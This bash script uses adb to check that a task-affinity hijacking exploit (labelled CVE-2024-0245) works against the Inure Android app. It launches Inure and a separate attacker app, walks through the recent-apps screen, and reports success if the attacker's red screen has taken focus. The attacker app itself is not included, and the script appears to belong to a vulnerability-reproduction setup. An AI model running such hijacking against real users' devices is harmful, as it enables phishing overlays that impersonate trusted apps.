#!/bin/bash
set -e

echo "========================================================="
echo "🔍 CVE-2024-0245 Task Hijacking Exploit Verification"
echo "========================================================="
echo ""

# Check if both apps are installed
echo "--- Checking app installations ---"
INURE_INSTALLED=$(adb shell pm list packages | grep "app.simple.inure" || echo "")
ATTACKER_INSTALLED=$(adb shell pm list packages | grep "com.cve20240245.taskhijacker" || echo "")

if [[ -z "$INURE_INSTALLED" ]]; then
    echo "❌ ERROR: Inure app not installed"
    echo "   Please run setup_app.sh first"
    exit 1
fi

if [[ -z "$ATTACKER_INSTALLED" ]]; then
    echo "❌ ERROR: Attacker app not installed"
    echo "   Please run exploit_manual.sh first"
    exit 1
fi

echo "✅ Inure app installed: $INURE_INSTALLED"
echo "✅ Attacker app installed: $ATTACKER_INSTALLED"
echo ""

# Step 1: Launch Inure app to show legitimate interface
echo "--- Step 1: Launching Inure app (legitimate interface) ---"
adb shell am start -n app.simple.inure/.activities.app.MainActivity
sleep 3
echo "✅ Inure app launched"

# Step 2: Launch Attacker app to inject into task stack
echo "--- Step 2: Launching Attacker app (injects into task) ---"
adb shell am start -n com.cve20240245.taskhijacker/.MainActivity
sleep 2
echo "✅ Attacker app launched (should have disappeared)"

# Step 3: Go to home screen
echo "--- Step 3: Going to home screen ---"
adb shell input keyevent KEYCODE_HOME
sleep 1
echo "✅ Home screen displayed"

# Step 4: Open recent apps
echo "--- Step 4: Opening recent apps ---"
adb shell input keyevent KEYCODE_APP_SWITCH
sleep 2
echo "✅ Recent apps opened"

# Step 5: Tap on Inure in recent apps (this should trigger the hijacked interface)
echo "--- Step 5: Tapping on Inure in recent apps ---"
# Find and tap on Inure in recent apps
adb shell uiautomator dump >/dev/null 2>&1
INURE_BOUNDS=$(adb shell cat /sdcard/window_dump.xml 2>/dev/null | grep -i "inure" | grep -o 'bounds="[^"]*"' | head -1 | sed 's/bounds="//;s/"//' || echo "")

if [[ -n "$INURE_BOUNDS" ]]; then
    X1=$(echo "$INURE_BOUNDS" | sed 's/\[//g;s/\].*//g' | cut -d',' -f1)
    Y1=$(echo "$INURE_BOUNDS" | sed 's/\[//g;s/\].*//g' | cut -d',' -f2)
    X2=$(echo "$INURE_BOUNDS" | sed 's/.*\]\[//g;s/\]//g' | cut -d',' -f1)
    Y2=$(echo "$INURE_BOUNDS" | sed 's/.*\]\[//g;s/\]//g' | cut -d',' -f2)
    
    CENTER_X=$(( (X1 + X2) / 2 ))
    CENTER_Y=$(( (Y1 + Y2) / 2 ))
    
    adb shell input tap $CENTER_X $CENTER_Y
    echo "✅ Tapped on Inure at coordinates ($CENTER_X, $CENTER_Y)"
else
    # Fallback: tap in the middle of the screen
    adb shell input tap 540 1000
    echo "✅ Tapped in center of recent apps (fallback)"
fi

sleep 3

# Step 6: Verify exploit success
echo "--- Step 6: Verifying exploit success ---"
CURRENT_ACTIVITY=$(adb shell dumpsys window 2>/dev/null | grep "mCurrentFocus" | cut -d'/' -f2 | cut -d'}' -f1 || echo "unknown")
echo "Current focused activity: $CURRENT_ACTIVITY"

# Check if we're in the hijacked state
if [[ "$CURRENT_ACTIVITY" == *"com.cve20240245.taskhijacker"* ]]; then
    echo ""
    echo "🎯 EXPLOIT SUCCESSFUL!"
    echo "====================="
    echo "✅ Task hijacking confirmed"
    echo "✅ Malicious app is currently focused"
    echo "✅ Inure app's task has been hijacked"
    echo ""
    echo "🔍 Verification Details:"
    echo "   - Expected: Inure app interface"
    echo "   - Actual: Attacker app interface (red screen)"
    echo "   - Task affinity hijacking: SUCCESSFUL"
    echo ""
    echo "⚠️  This confirms CVE-2024-0245 is exploitable"
    exit 0

elif [[ "$CURRENT_ACTIVITY" == *"app.simple.inure"* ]]; then
    echo ""
    echo "❌ EXPLOIT FAILED"
    echo "================"
    echo "Inure app is still focused - task hijacking did not occur"
    echo ""
    echo "🔍 Possible reasons:"
    echo "   - Task affinity not properly set"
    echo "   - Android version may have mitigations"
    echo "   - App may have been patched"
    echo ""
    echo "Expected: Attacker app interface (red screen)"
    echo "Actual: Inure app interface (normal screen)"
    exit 1

else
    echo ""
    echo "❌ EXPLOIT FAILED"
    echo "================"
    echo "Unable to determine exploit status"
    echo ""
    echo "🔍 Troubleshooting:"
    echo "   - Check if both apps are running"
    echo "   - Verify recent apps navigation worked"
    echo "   - Try manual verification steps"
    echo ""
    echo "Expected: Either Inure or Attacker app focused"
    echo "Actual: $CURRENT_ACTIVITY"
    exit 1
fi 